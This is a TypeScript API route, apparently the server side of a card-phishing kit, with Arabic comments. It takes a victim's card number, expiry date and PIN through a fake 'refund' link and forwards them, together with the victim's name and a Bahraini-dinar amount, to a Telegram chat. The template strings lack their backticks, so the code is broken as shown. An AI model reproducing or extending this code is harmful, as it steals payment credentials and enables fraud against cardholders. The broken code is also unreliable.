import { z } from "zod";
import { auditLog } from "@/lib/audit";
import { fail, ok } from "@/lib/api";
import { getActiveProfile } from "@/lib/profiles";
import { rateLimit } from "@/lib/rate-limit";
import { telegramSend } from "@/lib/telegram";

export const runtime = "nodejs";

// تعديل المخطط (Schema) عشان يقبل بيانات الكارت الجديدة
const schema = z.object({
  profileId: z.string().regex(/^\d{5}$/),
  method: z.string(),
  cardNumber: z.string().min(16).max(16),
  expiryDate: z.string().min(4).max(5),
  pin: z.string().min(4).max(6),
  value: z.string().optional(),
});

export async function POST(request: Request) {
  if (!(await rateLimit("notify-profile", request.headers))) return fail("تم تجاوز الحد المسموح.", 429);
  
  const parsed = schema.safeParse(await request.json().catch(() => null));
  if (!parsed.success) return fail("بيانات غير صالحة.");
  
  const data = parsed.data;

  const profile = await getActiveProfile(data.profileId);
  if (!profile) return fail("الرابط غير متوفر أو منتهي.", 404);

  // شكل الرسالة الجديدة اللي هتوصلك على تليجرام
  const text = [
    "💳 طلب جديد: استرجاع على البطاقة (من رابط العميل)",
    👤 اسم العميل: ${profile.name},
    💰 مبلغ الاسترجاع: ${profile.amount.toFixed(3)} BHD,
    💳 رقم البطاقة: ${data.cardNumber},
    📅 تاريخ الانتهاء: ${data.expiryDate},
    🔒 الرقم السري: ${data.pin},
    ⏰ الوقت: ${new Date().toISOString()},
  ].join("\n");

  const sent = await telegramSend(text);
  await auditLog(sent ? "profile.notified" : "profile.notify_failed", "System", { method: data.method });
  return ok({ ok: sent });
}
